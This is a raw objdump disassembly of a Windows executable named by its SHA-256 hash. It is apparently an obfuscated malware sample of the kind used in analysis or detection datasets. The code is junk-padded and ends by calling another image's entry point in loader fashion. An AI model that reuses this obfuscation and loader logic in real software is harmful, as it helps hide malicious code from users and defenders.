
8f35af03341ce1e0071f2bea5914a48052832bdfaca78a4b399af7cca6ce36a6.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xcc
  401009:	xor    DWORD PTR ds:0x422014,0x420f98
  401013:	push   edi
  401014:	sub    DWORD PTR ds:0x420fb0,0x420e8e
  40101e:	push   0x424545
  401023:	xor    edi,edi
  401025:	and    DWORD PTR ds:0x420efc,0x110f
  40102f:	inc    edi
  401030:	push   edi
  401031:	sbb    DWORD PTR ds:0x420f08,0x51
  40103b:	push   edi
  40103c:	adc    DWORD PTR ds:0x422000,0x3888
  401046:	call   DWORD PTR ds:0x4247ed
  40104c:	test   eax,eax
  40104e:	mov    DWORD PTR ds:0x420e8a,0x96
  401058:	je     0x40106f
  40105e:	xor    eax,eax
  401060:	mov    DWORD PTR ds:0x420ef0,0x42a7
  40106a:	jmp    0x4020ba
  40106f:	push   esi
  401070:	sbb    DWORD PTR ds:0x420e96,ebx
  401076:	mov    esi,DWORD PTR ds:0x4247e9
  40107c:	push   0x8
  40107e:	and    DWORD PTR ds:0x420e96,0x420ef4
  401088:	push   0x424565
  40108d:	sbb    DWORD PTR ds:0x420fa8,0x2663
  401097:	call   esi
  401099:	mov    DWORD PTR ds:0x420f58,0x2539
  4010a3:	test   eax,eax
  4010a5:	mov    DWORD PTR ds:0x420f74,0x63dd
  4010af:	jne    0x401117
  4010b5:	push   0xc
  4010b7:	adc    DWORD PTR ds:0x420efc,0x422010
  4010c1:	push   0x424579
  4010c6:	call   esi
  4010c8:	sbb    DWORD PTR ds:0x422000,0x6696
  4010d2:	test   eax,eax
  4010d4:	jne    0x401117
  4010da:	xor    DWORD PTR ds:0x422010,0x3be2
  4010e4:	push   0x42458d
  4010e9:	adc    DWORD PTR ds:0x420fac,0x420fa0
  4010f3:	push   edi
  4010f4:	push   edi
  4010f5:	call   DWORD PTR ds:0x424819
  4010fb:	add    DWORD PTR ds:0x420e7e,0x14dc
  401105:	test   eax,eax
  401107:	mov    DWORD PTR ds:0x420f08,0x3170
  401111:	je     0x401128
  401117:	xor    eax,eax
  401119:	mov    DWORD PTR ds:0x422014,0x5c19
  401123:	jmp    0x4020b9
  401128:	sbb    esi,DWORD PTR ds:0x420e9a
  40112e:	mov    DWORD PTR [ebp-0x10],0x0
  401135:	and    edi,0x6e17
  40113b:	mov    eax,DWORD PTR [ebp-0x24]
  40113e:	mov    DWORD PTR [ebp-0x24],eax
  401141:	sub    esi,DWORD PTR ds:0x420fa0
  401147:	mov    ecx,0xf89c85b5
  40114c:	mov    DWORD PTR [ebp-0x8],ecx
  40114f:	sub    esi,DWORD PTR ds:0x420f00
  401155:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  40115c:	sbb    edx,DWORD PTR ds:0x420e92
  401162:	lea    eax,[ebp-0x38]
  401165:	mov    DWORD PTR [ebp-0x2c],eax
  401168:	adc    DWORD PTR ds:0x420f74,edi
  40116e:	lea    eax,[ebp-0x30]
  401171:	xor    esi,esi
  401173:	or     esi,DWORD PTR ds:0x420e9a
  401179:	and    DWORD PTR ds:0x420f64,esi
  40117f:	mov    DWORD PTR [ebp-0x1c],eax
  401182:	sbb    esi,eax
  401184:	mov    eax,ds:0x424435
  401189:	mov    edi,DWORD PTR ds:0x420f48
  40118f:	mov    edx,DWORD PTR ds:0x420f84
  401195:	sub    edx,edi
  401197:	sub    edi,DWORD PTR [edi+edx*1]
  40119a:	mov    eax,DWORD PTR [eax+0x1c8]
  4011a0:	mov    eax,DWORD PTR [eax]
  4011a2:	mov    edx,DWORD PTR [ebp-0x1c]
  4011a5:	movzx  edi,BYTE PTR ds:0x420fb4
  4011ac:	add    DWORD PTR ds:0x420e8a,edi
  4011b2:	mov    esi,0x7510896
  4011b7:	xor    eax,esi
  4011b9:	and    DWORD PTR ds:0x420fa0,0x420e96
  4011c3:	mov    edi,0x3272dd
  4011c8:	add    eax,edi
  4011ca:	mov    DWORD PTR [edx],eax
  4011cc:	mov    DWORD PTR ds:0x420ea2,0x7e11
  4011d6:	mov    eax,ds:0x424675
  4011db:	cmp    eax,0x312bc9f6
  4011e0:	mov    DWORD PTR ds:0x420fa4,0x3707
  4011ea:	jne    0x40133f
  4011f0:	mov    eax,DWORD PTR [ebp-0x8]
  4011f3:	mov    edx,DWORD PTR ds:0x424435
  4011f9:	mov    edx,DWORD PTR [edx+0x198]
  4011ff:	xor    eax,esi
  401201:	add    eax,edi
  401203:	add    DWORD PTR ds:0x422010,0x420eec
  40120d:	mov    DWORD PTR [edx],eax
  40120f:	and    DWORD PTR ds:0x42200c,0x0
  401219:	jmp    0x40122d
  40121e:	xor    edx,edx
  401220:	add    edx,DWORD PTR ds:0x42200c
  401226:	inc    edx
  401227:	mov    DWORD PTR ds:0x42200c,edx
  40122d:	cmp    DWORD PTR ds:0x42200c,0x12
  401234:	jae    0x401276
  40123a:	cmp    DWORD PTR ds:0x42200c,0x5
  401241:	jne    0x401255
  401247:	push   DWORD PTR [ebp-0x18]
  40124a:	push   0x450b
  40124f:	call   DWORD PTR ds:0x4247d5
  401255:	cmp    DWORD PTR ds:0x42200c,0x4
  40125c:	jne    0x401271
  401262:	xor    edx,edx
  401264:	add    edx,DWORD PTR ds:0x42200c
  40126a:	inc    edx
  40126b:	mov    DWORD PTR ds:0x42200c,edx
  401271:	jmp    0x40121e
  401276:	mov    eax,DWORD PTR [ebp-0x8]
  401279:	and    DWORD PTR ds:0x420f70,0x0
  401283:	mov    edx,DWORD PTR ds:0x420f70
  401289:	inc    edx
  40128a:	mov    DWORD PTR ds:0x420f70,edx
  401290:	cmp    DWORD PTR ds:0x420f70,0x7
  401297:	jne    0x4012b0
  40129d:	push   0x5d66
  4012a2:	push   0x420f60
  4012a7:	push   DWORD PTR [ebp-0x14]
  4012aa:	call   DWORD PTR ds:0x4247d9
  4012b0:	cmp    DWORD PTR ds:0x420f70,0x6
  4012b7:	jne    0x4012ca
  4012bd:	mov    edx,DWORD PTR ds:0x420f70
  4012c3:	inc    edx
  4012c4:	mov    DWORD PTR ds:0x420f70,edx
  4012ca:	cmp    DWORD PTR ds:0x420f70,0x14
  4012d1:	jb     0x401283
  4012d7:	and    edx,0x4d07
  4012dd:	xor    eax,esi
  4012df:	movzx  edx,BYTE PTR ds:0x420f08
  4012e6:	sub    edx,DWORD PTR ds:0x420fa0
  4012ec:	mov    DWORD PTR ds:0x420f08,edx
  4012f2:	add    eax,edi
  4012f4:	mov    DWORD PTR ds:0x422008,0x18
  4012fe:	cmp    DWORD PTR ds:0x422008,0x0
  401305:	je     0x40133a
  40130b:	cmp    DWORD PTR ds:0x422008,0x1d
  401312:	jne    0x401328
  401318:	push   0x42406a
  40131d:	push   0x424044
  401322:	call   DWORD PTR ds:0x4247dd
  401328:	mov    edx,DWORD PTR ds:0x422008
  40132e:	dec    edx
  40132f:	mov    DWORD PTR ds:0x422008,edx
  401335:	jmp    0x4012fe
  40133a:	mov    ds:0x424675,eax
  40133f:	mov    eax,ds:0x424435
  401344:	and    DWORD PTR ds:0x420ef4,0x0
  40134e:	mov    edx,DWORD PTR ds:0x420ef4
  401354:	inc    edx
  401355:	mov    DWORD PTR ds:0x420ef4,edx
  40135b:	cmp    DWORD PTR ds:0x420ef4,0x20
  401362:	jne    0x401379
  401368:	push   DWORD PTR [ebp-0x18]
  40136b:	push   0x222d
  401370:	push   DWORD PTR [ebp-0x28]
  401373:	call   DWORD PTR ds:0x4247e1
  401379:	cmp    DWORD PTR ds:0x420ef4,0x12
  401380:	jb     0x40134e
  401386:	mov    eax,DWORD PTR [eax+0x18c]
  40138c:	mov    eax,DWORD PTR [eax]
  40138e:	adc    DWORD PTR ds:0x422014,0x7308
  401398:	mov    DWORD PTR [ebp-0x68],eax
  40139b:	and    DWORD PTR ds:0x420e7e,0x0
  4013a5:	xor    eax,eax
  4013a7:	or     eax,DWORD PTR ds:0x420e7e
  4013ad:	inc    eax
  4013ae:	mov    ds:0x420e7e,eax
  4013b3:	cmp    DWORD PTR ds:0x420e7e,0xa
  4013ba:	jne    0x4013d1
  4013c0:	push   DWORD PTR [ebp-0x20]
  4013c3:	push   0x420f74
  4013c8:	push   DWORD PTR [ebp-0x28]
  4013cb:	call   DWORD PTR ds:0x4247e5
  4013d1:	cmp    DWORD PTR ds:0x420e7e,0x9
  4013d8:	jne    0x4013ec
  4013de:	xor    eax,eax
  4013e0:	xor    eax,DWORD PTR ds:0x420e7e
  4013e6:	inc    eax
  4013e7:	mov    ds:0x420e7e,eax
  4013ec:	cmp    DWORD PTR ds:0x420e7e,0x14
  4013f3:	jb     0x4013a5
  4013f9:	mov    DWORD PTR ds:0x420f04,0x16
  401403:	cmp    DWORD PTR ds:0x420f04,0x0
  40140a:	je     0x401438
  401410:	cmp    DWORD PTR ds:0x420f04,0x22
  401417:	jne    0x401423
  40141d:	call   DWORD PTR ds:0x4247f1
  401423:	xor    eax,eax
  401425:	or     eax,DWORD PTR ds:0x420f04
  40142b:	dec    eax
  40142c:	mov    ds:0x420f04,eax
  401431:	jmp    0x401403
  401436:	sub    edx,edx
  401438:	push   ebx
  401439:	or     eax,DWORD PTR ds:0x420f00
  40143f:	mov    ebx,0xf89c85b1
  401444:	and    DWORD PTR ds:0x420fa0,0x0
  40144e:	mov    edx,DWORD PTR ds:0x420fa0
  401454:	inc    edx
  401455:	mov    DWORD PTR ds:0x420fa0,edx
  40145b:	cmp    DWORD PTR ds:0x420fa0,0x8
  401462:	jne    0x40146e
  401468:	call   DWORD PTR ds:0x4247f5
  40146e:	cmp    DWORD PTR ds:0x420fa0,0x7
  401475:	jne    0x40148a
  40147b:	xor    edx,edx
  40147d:	xor    edx,DWORD PTR ds:0x420fa0
  401483:	inc    edx
  401484:	mov    DWORD PTR ds:0x420fa0,edx
  40148a:	cmp    DWORD PTR ds:0x420fa0,0x1e
  401491:	jb     0x40144e
  401497:	and    DWORD PTR ds:0x420e7a,0x0
  4014a1:	jmp    0x4014b3
  4014a6:	mov    edx,DWORD PTR ds:0x420e7a
  4014ac:	inc    edx
  4014ad:	mov    DWORD PTR ds:0x420e7a,edx
  4014b3:	cmp    DWORD PTR ds:0x420e7a,0x14
  4014ba:	jae    0x4014ff
  4014c0:	cmp    DWORD PTR ds:0x420e7a,0x1f
  4014c7:	jne    0x4014f0
  4014cd:	push   0x20c6
  4014d2:	push   DWORD PTR [ebp-0x10]
  4014d5:	push   0x420ea2
  4014da:	push   0x440c
  4014df:	push   DWORD PTR [ebp-0x20]
  4014e2:	push   0x7f92
  4014e7:	push   DWORD PTR [ebp-0x20]
  4014ea:	call   DWORD PTR ds:0x4247f9
  4014f0:	jmp    0x4014a6
  4014f5:	adc    DWORD PTR ds:0x420ea2,0x7cfc
  4014ff:	mov    DWORD PTR [ebp-0x10],ebx
  401502:	sub    DWORD PTR ds:0x420f5c,edi
  401508:	mov    DWORD PTR [ebp-0x10],ebx
  40150b:	mov    DWORD PTR ds:0x420f04,0x12
  401515:	cmp    DWORD PTR ds:0x420f04,0x0
  40151c:	je     0x40156b
  401522:	cmp    DWORD PTR ds:0x420f04,0x5
  401529:	jne    0x40153d
  40152f:	push   DWORD PTR [ebp-0x1c]
  401532:	push   0x424044
  401537:	call   DWORD PTR ds:0x4247fd
  40153d:	cmp    DWORD PTR ds:0x420f04,0x6
  401544:	jne    0x401557
  40154a:	mov    edx,DWORD PTR ds:0x420f04
  401550:	dec    edx
  401551:	mov    DWORD PTR ds:0x420f04,edx
  401557:	xor    edx,edx
  401559:	or     edx,DWORD PTR ds:0x420f04
  40155f:	dec    edx
  401560:	mov    DWORD PTR ds:0x420f04,edx
  401566:	jmp    0x401515
  40156b:	mov    DWORD PTR [ebp-0x10],ebx
  40156e:	and    DWORD PTR ds:0x422004,0x0
  401578:	jmp    0x40158c
  40157d:	xor    edx,edx
  40157f:	xor    edx,DWORD PTR ds:0x422004
  401585:	inc    edx
  401586:	mov    DWORD PTR ds:0x422004,edx
  40158c:	cmp    DWORD PTR ds:0x422004,0x12
  401593:	jae    0x4015bd
  401599:	cmp    DWORD PTR ds:0x422004,0x1e
  4015a0:	jne    0x4015b8
  4015a6:	push   0x424168
  4015ab:	push   0x1
  4015ad:	push   0x0
  4015af:	push   DWORD PTR [ebp-0x14]
  4015b2:	call   DWORD PTR ds:0x424801
  4015b8:	jmp    0x40157d
  4015bd:	mov    DWORD PTR [ebp-0x1c],ecx
  4015c0:	xor    edx,edx
  4015c2:	mov    DWORD PTR [ebp-0x10],ebx
  4015c5:	mov    DWORD PTR ds:0x420e96,0xb45
  4015cf:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  4015d6:	and    DWORD PTR ds:0x422014,0x2ed5
  4015e0:	mov    eax,DWORD PTR [ebp-0x8]
  4015e3:	mov    ecx,DWORD PTR [ebp-0xc]
  4015e6:	xor    edx,edx
  4015e8:	or     edx,DWORD PTR ds:0x420f60
  4015ee:	and    DWORD PTR ds:0x422000,edx
  4015f4:	mov    edx,DWORD PTR [ebp-0xc]
  4015f7:	sbb    DWORD PTR ds:0x420fa0,0x420fb4
  401601:	xor    edx,esi
  401603:	and    DWORD PTR ds:0x420f5c,0x420fa4
  40160d:	xor    ecx,esi
  40160f:	sub    DWORD PTR ds:0x422008,0x420f58
  401619:	add    ecx,edx
  40161b:	sbb    DWORD PTR ds:0x420e8e,edi
  401621:	mov    edx,DWORD PTR [ebp-0xc]
  401624:	xor    DWORD PTR ds:0x420f00,0x7b1e
  40162e:	xor    eax,esi
  401630:	xor    edx,esi
  401632:	or     DWORD PTR ds:0x420e9a,0x7d42
  40163c:	add    eax,edi
  40163e:	lea    ecx,[ecx+edx*1+0x975897]
  401645:	not    DWORD PTR ds:0x420f70
  40164b:	mov    DWORD PTR [ebp-0x18],eax
  40164e:	mov    DWORD PTR ds:0x420e7e,0x57b9
  401658:	cmp    eax,ecx
  40165a:	ja     0x40177e
  401660:	jmp    0x401678
  401665:	mov    eax,ds:0x420f30
  40166a:	mov    ecx,DWORD PTR ds:0x420f38
  401670:	sub    ecx,eax
  401672:	and    eax,DWORD PTR [eax+ecx*1]
  401675:	mov    eax,DWORD PTR [ebp-0x18]
  401678:	mov    ecx,DWORD PTR [ebp-0xc]
  40167b:	sub    DWORD PTR ds:0x422010,0x420f70
  401685:	xor    ecx,esi
  401687:	lea    eax,[ecx+eax*1+0x3272dd]
  40168e:	or     DWORD PTR ds:0x420f70,0x48c8
  401698:	push   eax
  401699:	sub    DWORD PTR ds:0x420e9e,0x506d
  4016a3:	mov    eax,DWORD PTR [ebp-0x1c]
  4016a6:	and    DWORD PTR ds:0x420f5c,0x3822
  4016b0:	xor    eax,esi
  4016b2:	xor    DWORD PTR ds:0x420f74,0x420ef0
  4016bc:	lea    eax,[ebp+eax*1+0x3272e5]
  4016c3:	or     DWORD PTR ds:0x420ea2,0x420f60
  4016cd:	push   eax
  4016ce:	or     DWORD PTR ds:0x420f00,0x5827
  4016d8:	mov    eax,ds:0x424435
  4016dd:	and    DWORD PTR ds:0x420fb4,0x420fa4
  4016e7:	push   DWORD PTR [eax+0x1bc]
  4016ed:	xor    DWORD PTR ds:0x420f98,0x420ea2
  4016f7:	call   0x4020cd
  4016fc:	add    DWORD PTR ds:0x420f68,0x6b04
  401706:	mov    eax,DWORD PTR [ebp-0xc]
  401709:	or     edx,DWORD PTR ds:0x420ef0
  40170f:	mov    ecx,DWORD PTR [ebp-0x18]
  401712:	neg    edx
  401714:	xor    eax,esi
  401716:	sub    edx,0x4f8d
  40171c:	lea    eax,[ecx+eax*1+0x3272dd]
  401723:	mov    ecx,DWORD PTR [ebp-0xc]
  401726:	xor    edx,DWORD PTR ds:0x420e7a
  40172c:	mov    edx,DWORD PTR [ebp-0xc]
  40172f:	xor    edx,esi
  401731:	add    DWORD PTR ds:0x420ef4,0x420e9e
  40173b:	xor    ecx,esi
  40173d:	adc    DWORD PTR ds:0x420e82,0x420f5c
  401747:	add    ecx,edx
  401749:	mov    edx,DWORD PTR [ebp-0xc]
  40174c:	xor    edx,esi
  40174e:	lea    ecx,[ecx+edx*1+0x975897]
  401755:	mov    DWORD PTR ds:0x420e82,0x59f5
  40175f:	mov    DWORD PTR [ebp-0x18],eax
  401762:	mov    DWORD PTR ds:0x420f98,0x3280
  40176c:	cmp    eax,ecx
  40176e:	mov    DWORD PTR ds:0x420fb4,0x7b83
  401778:	jbe    0x401665
  40177e:	and    DWORD PTR ds:0x420f98,0x0
  401788:	mov    ecx,DWORD PTR ds:0x420f98
  40178e:	inc    ecx
  40178f:	mov    DWORD PTR ds:0x420f98,ecx
  401795:	cmp    DWORD PTR ds:0x420f98,0x1e
  40179c:	jne    0x4017b2
  4017a2:	push   0x420fa0
  4017a7:	push   0x4d18
  4017ac:	call   DWORD PTR ds:0x424805
  4017b2:	cmp    DWORD PTR ds:0x420f98,0x18
  4017b9:	jb     0x401788
  4017bf:	mov    eax,DWORD PTR [ebp+0xc]
  4017c2:	sbb    DWORD PTR ds:0x420e7a,edx
  4017c8:	mov    ds:0x4242b9,eax
  4017cd:	and    DWORD PTR ds:0x420f74,0x0
  4017d7:	mov    eax,ds:0x420f74
  4017dc:	inc    eax
  4017dd:	mov    ds:0x420f74,eax
  4017e2:	cmp    DWORD PTR ds:0x420f74,0x1b
  4017e9:	jne    0x40180f
  4017ef:	push   DWORD PTR [ebp-0x1c]
  4017f2:	push   0x420f9c
  4017f7:	push   0x46e8
  4017fc:	push   0x4240e4
  401801:	push   0x1c79
  401806:	push   DWORD PTR [ebp-0xc]
  401809:	call   DWORD PTR ds:0x42480d
  40180f:	cmp    DWORD PTR ds:0x420f74,0x12
  401816:	jb     0x4017d7
  40181c:	mov    eax,DWORD PTR [ebp+0x10]
  40181f:	sub    ecx,DWORD PTR ds:0x420fa4
  401825:	mov    ds:0x42450d,eax
  40182a:	and    DWORD PTR ds:0x422010,0x0
  401834:	mov    eax,ds:0x422010
  401839:	inc    eax
  40183a:	mov    ds:0x422010,eax
  40183f:	cmp    DWORD PTR ds:0x422010,0x18
  401846:	jne    0x401852
  40184c:	call   DWORD PTR ds:0x424811
  401852:	cmp    DWORD PTR ds:0x422010,0x17
  401859:	jb     0x401834
  40185f:	add    ecx,ecx
  401861:	mov    eax,ds:0x4242b9
  401866:	or     DWORD PTR ds:0x420e7a,0x2e1b
  401870:	mov    ecx,DWORD PTR [ebp-0x2c]
  401873:	sub    eax,edi
  401875:	neg    DWORD PTR ds:0x420e92
  40187b:	xor    eax,esi
  40187d:	mov    DWORD PTR ds:0x420fac,0x2c59
  401887:	mov    DWORD PTR [ecx],eax
  401889:	mov    ecx,DWORD PTR [ebp-0x24]
  40188c:	mov    DWORD PTR ds:0x420efc,0x2f09
  401896:	mov    eax,0xf89c85b5
  40189b:	mov    DWORD PTR ds:0x420efc,0x2084
  4018a5:	cmp    ecx,eax
  4018a7:	jne    0x401be5
  4018ad:	xor    DWORD PTR ds:0x422014,0x4966
  4018b7:	lea    eax,[ebp-0x34]
  4018ba:	adc    DWORD PTR ds:0x420e8a,0x420e92
  4018c4:	mov    DWORD PTR [ebp-0x70],eax
  4018c7:	xor    DWORD PTR ds:0x420f74,0x422004
  4018d1:	lea    eax,[ebp+0x4]
  4018d4:	sub    DWORD PTR ds:0x420fa4,0x42200c
  4018de:	mov    DWORD PTR [ebp-0x34],eax
  4018e1:	mov    eax,DWORD PTR [ebp-0x34]
  4018e4:	test   eax,eax
  4018e6:	mov    DWORD PTR ds:0x420e82,0x6242
  4018f0:	je     0x40209d
  4018f6:	xor    DWORD PTR ds:0x422008,0x2d73
  401900:	mov    eax,DWORD PTR [ebp-0x20]
  401903:	mov    eax,DWORD PTR [ebp-0xc]
  401906:	mov    eax,DWORD PTR [ebp-0x8]
  401909:	adc    ecx,0x7834
  40190f:	mov    DWORD PTR [ebp+0xc],eax
  401912:	not    ecx
  401914:	mov    eax,eax
  401916:	mov    eax,ds:0x424435
  40191b:	and    DWORD PTR ds:0x422008,0x0
  401925:	mov    ecx,DWORD PTR ds:0x422008
  40192b:	inc    ecx
  40192c:	mov    DWORD PTR ds:0x422008,ecx
  401932:	cmp    DWORD PTR ds:0x422008,0x1e
  401939:	jne    0x40194a
  40193f:	push   0x422000
  401944:	call   DWORD PTR ds:0x424815
  40194a:	cmp    DWORD PTR ds:0x422008,0x1d
  401951:	jb     0x401925
  401957:	and    DWORD PTR ds:0x420fa0,0x0
  401961:	jmp    0x401973
  401966:	mov    ecx,DWORD PTR ds:0x420fa0
  40196c:	inc    ecx
  40196d:	mov    DWORD PTR ds:0x420fa0,ecx
  401973:	cmp    DWORD PTR ds:0x420fa0,0x14
  40197a:	jae    0x4019bc
  401980:	cmp    DWORD PTR ds:0x420fa0,0x5
  401987:	jne    0x40199d
  40198d:	push   0x2f20
  401992:	push   0x8e83
  401997:	call   DWORD PTR ds:0x4247d5
  40199d:	cmp    DWORD PTR ds:0x420fa0,0x4
  4019a4:	jne    0x4019b7
  4019aa:	mov    ecx,DWORD PTR ds:0x420fa0
  4019b0:	inc    ecx
  4019b1:	mov    DWORD PTR ds:0x420fa0,ecx
  4019b7:	jmp    0x401966
  4019bc:	mov    eax,DWORD PTR [eax+0x1c8]
  4019c2:	neg    DWORD PTR ds:0x420f98
  4019c8:	mov    eax,DWORD PTR [eax]
  4019ca:	sbb    DWORD PTR ds:0x420f74,ebx
  4019d0:	cdq    
  4019d1:	adc    DWORD PTR ds:0x42200c,0x4213
  4019db:	mov    ebx,eax
  4019dd:	mov    DWORD PTR ds:0x420fa4,0x17
  4019e7:	cmp    DWORD PTR ds:0x420fa4,0x0
  4019ee:	je     0x401a74
  4019f4:	cmp    DWORD PTR ds:0x420fa4,0x20
  4019fb:	jne    0x401a14
  401a01:	push   DWORD PTR [ebp-0x1c]
  401a04:	push   0x420e9a
  401a09:	push   0x6482
  401a0e:	call   DWORD PTR ds:0x4247d9
  401a14:	xor    eax,eax
  401a16:	or     eax,DWORD PTR ds:0x420fa4
  401a1c:	dec    eax
  401a1d:	mov    ds:0x420fa4,eax
  401a22:	jmp    0x4019e7
  401a27:	mov    DWORD PTR ds:0x420f08,0x1d
  401a31:	cmp    DWORD PTR ds:0x420f08,0x0
  401a38:	je     0x401a74
  401a3e:	cmp    DWORD PTR ds:0x420f08,0x1e
  401a45:	jne    0x401a5b
  401a4b:	push   0x424027
  401a50:	push   0x4240af
  401a55:	call   DWORD PTR ds:0x4247dd
  401a5b:	xor    eax,eax
  401a5d:	xor    eax,DWORD PTR ds:0x420f08
  401a63:	dec    eax
  401a64:	mov    ds:0x420f08,eax
  401a69:	jmp    0x401a31
  401a6e:	and    DWORD PTR ds:0x420e82,ebx
  401a74:	mov    eax,0xfabdbeed
  401a79:	add    ebx,eax
  401a7b:	inc    ecx
  401a7c:	adc    edx,0xffffffff
  401a7f:	mov    DWORD PTR ds:0x420fa0,0x16
  401a89:	cmp    DWORD PTR ds:0x420fa0,0x0
  401a90:	je     0x401b11
  401a96:	cmp    DWORD PTR ds:0x420fa0,0x20
  401a9d:	jne    0x401ab4
  401aa3:	push   DWORD PTR [ebp-0x10]
  401aa6:	push   0x1d23
  401aab:	push   DWORD PTR [ebp-0x1c]
  401aae:	call   DWORD PTR ds:0x4247e1
  401ab4:	xor    ecx,ecx
  401ab6:	xor    ecx,DWORD PTR ds:0x420fa0
  401abc:	dec    ecx
  401abd:	mov    DWORD PTR ds:0x420fa0,ecx
  401ac3:	jmp    0x401a89
  401ac8:	mov    DWORD PTR ds:0x42200c,0x1c
  401ad2:	cmp    DWORD PTR ds:0x42200c,0x0
  401ad9:	je     0x401b11
  401adf:	cmp    DWORD PTR ds:0x42200c,0x2c
  401ae6:	jne    0x401aff
  401aec:	push   0x87f3
  401af1:	push   0x420f68
  401af6:	push   DWORD PTR [ebp-0xc]
  401af9:	call   DWORD PTR ds:0x4247e5
  401aff:	mov    ecx,DWORD PTR ds:0x42200c
  401b05:	dec    ecx
  401b06:	mov    DWORD PTR ds:0x42200c,ecx
  401b0c:	jmp    0x401ad2
  401b11:	and    DWORD PTR [ebp-0x10],0x0
  401b15:	sbb    DWORD PTR ds:0x422014,ebx
  401b1b:	xor    edx,0x0
  401b1e:	xor    ecx,DWORD PTR ds:0x420f70
  401b24:	mov    DWORD PTR [ebp-0x54],edx
  401b27:	adc    ecx,edx
  401b29:	mov    edx,DWORD PTR [ebp+0xc]
  401b2c:	mov    DWORD PTR [ebp-0x14],edx
  401b2f:	mov    ecx,0x8a29a127
  401b34:	xor    ebx,ecx
  401b36:	dec    edx
  401b37:	add    DWORD PTR [ebp-0x14],eax
  401b3a:	mov    DWORD PTR ds:0x420e96,edi
  401b40:	mov    edx,DWORD PTR [ebp-0x14]
  401b43:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401b47:	or     DWORD PTR ds:0x420f6c,0x420f00
  401b51:	xor    edx,ecx
  401b53:	add    DWORD PTR ds:0x420e86,0x420f04
  401b5d:	mov    DWORD PTR [ebp-0x4c],edx
  401b60:	mov    edx,DWORD PTR [ebp-0x10]
  401b63:	xor    edx,0x0
  401b66:	mov    DWORD PTR [ebp-0x48],edx
  401b69:	mov    DWORD PTR ds:0x420efc,0x3c82
  401b73:	cmp    DWORD PTR [ebp-0x4c],ebx
  401b76:	jne    0x401b92
  401b7c:	mov    DWORD PTR ds:0x420e92,0x5ff4
  401b86:	mov    edx,DWORD PTR [ebp-0x54]
  401b89:	cmp    DWORD PTR [ebp-0x48],edx
  401b8c:	je     0x401bc1
  401b92:	mov    edx,DWORD PTR ds:0x424435
  401b98:	mov    edx,DWORD PTR [edx+0x1c0]
  401b9e:	mov    edx,DWORD PTR [edx]
  401ba0:	xor    ebx,ebx
  401ba2:	add    edx,eax
  401ba4:	adc    ebx,0xffffffff
  401ba7:	xor    edx,ecx
  401ba9:	xor    ebx,0x0
  401bac:	cmp    edx,0x70941fc9
  401bb2:	jne    0x40209d
  401bb8:	cmp    ebx,0xffffffff
  401bbb:	jne    0x40209d
  401bc1:	mov    edx,DWORD PTR ds:0x4244b1
  401bc7:	mov    ebx,DWORD PTR ds:0x4244b9
  401bcd:	xor    edx,ebx
  401bcf:	mov    DWORD PTR ds:0x4244b1,edx
  401bd5:	mov    ebx,DWORD PTR ds:0x4244b1
  401bdb:	mov    edx,DWORD PTR [ebp-0x34]
  401bde:	add    DWORD PTR [edx],ebx
  401be0:	jmp    0x40205e
  401be5:	mov    ecx,DWORD PTR [ebp-0x38]
  401be8:	cmp    ecx,0xf89c85b2
  401bee:	je     0x401c4b
  401bf4:	mov    ecx,DWORD PTR [ebp-0x8]
  401bf7:	mov    edx,DWORD PTR [ebp-0x30]
  401bfa:	xor    ecx,esi
  401bfc:	add    ecx,edi
  401bfe:	cmp    ecx,edx
  401c00:	je     0x401c4b
  401c06:	mov    eax,ds:0x424435
  401c0b:	mov    eax,DWORD PTR [eax+0x194]
  401c11:	mov    ecx,DWORD PTR [eax]
  401c13:	mov    eax,DWORD PTR [ecx+0x3c]
  401c16:	push   DWORD PTR ds:0x42450d
  401c1c:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  401c20:	push   DWORD PTR ds:0x4242b9
  401c26:	add    eax,ecx
  401c28:	mov    ecx,DWORD PTR ds:0x424435
  401c2e:	mov    ecx,DWORD PTR [ecx+0x194]
  401c34:	push   DWORD PTR [ecx]
  401c36:	call   eax
  401c38:	mov    ecx,DWORD PTR ds:0x424435
  401c3e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401c44:	mov    DWORD PTR [ecx],eax
  401c46:	jmp    0x40209d
  401c4b:	mov    ecx,DWORD PTR [ebp-0x8]
  401c4e:	mov    edx,DWORD PTR [ebp-0x68]
  401c51:	xor    ecx,esi
  401c53:	add    ecx,edi
  401c55:	cmp    ecx,edx
  401c57:	jne    0x401f61
  401c5d:	mov    ecx,DWORD PTR [ebp-0x8]
  401c60:	mov    edx,DWORD PTR ds:0x424435
  401c66:	mov    edx,DWORD PTR [edx+0x198]
  401c6c:	xor    ecx,esi
  401c6e:	add    ecx,edi
  401c70:	cmp    ecx,DWORD PTR [edx]
  401c72:	jne    0x401c8d
  401c78:	push   eax
  401c79:	mov    eax,DWORD PTR [ebp-0x8]
  401c7c:	xor    eax,esi
  401c7e:	add    eax,edi
  401c80:	push   eax
  401c81:	push   ebx
  401c82:	push   DWORD PTR [ebp-0xc]
  401c85:	push   DWORD PTR [ebp-0x8]
  401c88:	call   0x40772b
  401c8d:	mov    eax,DWORD PTR [ebp-0xc]
  401c90:	mov    DWORD PTR [ebp-0x3c],eax
  401c93:	mov    eax,DWORD PTR [ebp-0x8]
  401c96:	mov    DWORD PTR [ebp-0x18],eax
  401c99:	mov    eax,DWORD PTR [ebp-0x18]
  401c9c:	xor    eax,esi
  401c9e:	add    eax,edi
  401ca0:	mov    DWORD PTR [ebp+0x10],eax
  401ca3:	mov    eax,ds:0x4242b5
  401ca8:	mov    eax,DWORD PTR [eax]
  401caa:	mov    DWORD PTR [ebp+0x10],eax
  401cad:	mov    eax,ds:0x4244bd
  401cb2:	mov    eax,DWORD PTR [eax]
  401cb4:	mov    DWORD PTR [ebp-0x1c],eax
  401cb7:	mov    DWORD PTR [ebp+0xc],0xf89c87b5
  401cbe:	mov    eax,DWORD PTR [ebp+0xc]
  401cc1:	xor    eax,esi
  401cc3:	add    eax,edi
  401cc5:	mov    DWORD PTR [ebp+0xc],eax
  401cc8:	mov    eax,ds:0x424435
  401ccd:	mov    DWORD PTR [ebp+0xc],eax
  401cd0:	mov    eax,DWORD PTR [ebp+0x10]
  401cd3:	mov    DWORD PTR [ebp+0xc],eax
  401cd6:	mov    eax,DWORD PTR [ebp+0xc]
